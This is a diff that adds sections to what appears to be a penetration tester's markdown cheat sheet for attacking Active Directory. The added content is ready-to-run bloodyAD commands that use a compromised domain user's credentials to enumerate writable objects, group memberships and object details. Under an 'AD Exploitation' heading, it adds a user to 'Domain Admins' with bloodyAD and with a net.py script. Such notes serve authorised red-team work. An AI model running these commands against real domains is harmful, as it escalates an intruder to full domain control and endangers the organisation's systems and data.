@@ -32,3 +32,25 @@ cd ~/bloodhound
 ```
 
 ## Targeted Enum
+
+### Get pwned user outbound object control
+```bash
+bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" get writable --otype USER --detail
+```
+
+### Enum group membership
+```bash
+bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" get membership john.doe
+```
+
+### Get object details
+```bash
+bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" get object "Domain Admins"
+```
+## AD Exploitation
+
+### Add user to group
+```bash
+bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" add groupMember "Domain Admins" "john.doe"
+python3 net.py "$domain/$domainuser:$domainuserpwd@$dcip" group -name "Domain Admins" -add "john.doe"
+```
